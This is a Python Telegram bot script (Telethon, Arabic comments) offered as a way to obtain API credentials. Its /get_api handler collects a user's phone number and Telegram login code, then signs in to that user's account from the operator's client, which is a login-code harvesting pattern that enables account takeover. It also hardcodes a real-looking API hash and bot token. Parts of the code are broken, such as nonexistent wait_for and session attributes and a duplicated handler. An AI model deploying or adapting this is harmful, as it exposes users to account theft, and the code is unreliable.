from time import sleep
import logging
import asyncio
import time
import datetime
import os
import requests
import re
import random
import telethon
from telethon import events, TelegramClient, functions
from telethon.tl import functions, types
from telethon.tl.types import InputPeerUser
from telethon.errors import FloodWaitError
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
    YouBlockedUserError,
    UserNotParticipantError
)
from telethon.sessions import StringSession
from telethon.utils import get_display_name
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import (
    ImportChatInviteRequest as Get,
    GetHistoryRequest,
    ImportChatInviteRequest,
    GetMessagesViewsRequest
)
from telethon.tl.functions.channels import (
    LeaveChannelRequest,
    JoinChannelRequest,
    InviteToChannelRequest,
    GetParticipantRequest
)
from telethon.tl.functions.contacts import UnblockRequest
from telethon.tl.functions.messages import (
    SendVoteRequest,
    SendReactionRequest
)

from telethon import TelegramClient, events, Button
import asyncio

# بيانات الدخول للبوت
api_id = 17211426 #  أدخل رقم API ID الخاص بك
api_hash = '656a097533402eb717ba82298a752177'  # أدخل هاش API الخاص بك
bot_token = '7359528819:AAFwzmAPxsVZ4piI8CaSxiseNWIs6lbPKHg'  # أدخل توكن البوت

# إنشاء عميل تيلثون
client = TelegramClient('my_bot', api_id, api_hash)

# تعريف الكيبورد مع خيارات الردود
keyboard = [
    [Button.inline("رقم هاتفي", data="phone_number"), Button.inline("رمز الدخول", data="auth_code")]
]

@client.on(events.NewMessage(pattern='/get_api'))
async def get_api_handler(event):
    await event.respond("أرسل لي رقم هاتفك.")

@client.on(events.CallbackQuery())
async def callback_handler(event):
    data = event.data.decode()

    if data == 'phone_number':
        await event.edit("أرسل لي رقم هاتفك.")
    elif data == 'auth_code':
        await event.edit("أرسل لي رمز الدخول الذي تلقيت.")

@client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond("مرحبا! 👋", buttons=keyboard)

@client.on(events.NewMessage(pattern='/get_api'))
async def get_api_handler(event):
    await event.respond("أرسل لي رقم هاتفك.")

    # انتظار الرسالة من المستخدم 
    phone = await client.wait_for(events.NewMessage(from_users=event.sender_id))
    phone_number = phone.message.text

    #  ارسال رمز الدخول
    await client.send_code_request(phone_number)
    await event.respond("أرسل لي رمز الدخول الذي تلقيت.")

    # انتظار رمز الدخول 
    code = await client.wait_for(events.NewMessage(from_users=event.sender_id))
    code_message = code.message.text

    try:
        #  تسجيل الدخول باستخدام رمز الدخول 
        await client.sign_in(phone_number, code_message)
        api_id = client.session.api_id
        api_hash = client.session.api_hash

        #  ارسال api_id + api_hash
        await event.respond(f"API ID: {api_id}\nAPI Hash: {api_hash}")

    except Exception as e:
        await event.respond(f"حدث خطأ: {e}")

async def main():
    await client.start(bot_token=bot_token) # استخدم bot_token عند بدء تشغيل البوت
    print("البوت جاهز للعمل")
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
